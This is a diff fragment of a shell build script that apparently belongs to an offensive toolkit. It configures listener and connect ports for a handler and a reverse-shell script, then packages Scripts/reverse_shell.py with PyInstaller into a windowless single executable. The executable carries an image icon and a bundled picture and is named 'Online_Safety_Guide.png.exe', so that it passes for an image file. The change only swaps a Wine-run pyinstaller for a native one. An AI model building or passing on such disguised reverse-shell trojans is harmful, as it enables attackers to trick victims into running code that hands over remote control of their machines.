@@ -94,9 +94,9 @@ sed -i 's/listen_port = .*/listen_port = '$listen_port'/' $handler
 sed -i 's/conn_port = .*/conn_port = '$connect_port'/' $rev_sh
 
 
-# OPTIONS AND DOCUMENTATION FOR BELOW COMMANDS AT WINE HELP - Command: "wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -h"
+# OPTIONS AND DOCUMENTATION FOR BELOW COMMANDS AT PyInstaller HELP - Command: "pyinstaller -h"
 
-wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "$(dirname "$0")/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon $(dirname "$0")/Res/Icons/img.ico --distpath $(dirname "$0")/dist --workpath $(dirname "$0")/build --specpath $(dirname "$0") -n Online_Safety_Guide.png $(dirname "$0")/Scripts/reverse_shell.py
+pyinstaller --add-data "$(dirname "$0")/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon $(dirname "$0")/Res/Icons/img.ico --distpath $(dirname "$0")/dist --workpath $(dirname "$0")/build --specpath $(dirname "$0") -n Online_Safety_Guide.png $(dirname "$0")/Scripts/reverse_shell.py
 
 cp $(dirname "$0")/dist/Online_Safety_Guide.png.exe ./Online_Safety_Guide.png.exe
 rm -r $(dirname "$0")/dist/ $(dirname "$0")/build/ $(dirname "$0")/Online_Safety_Guide.png.spec
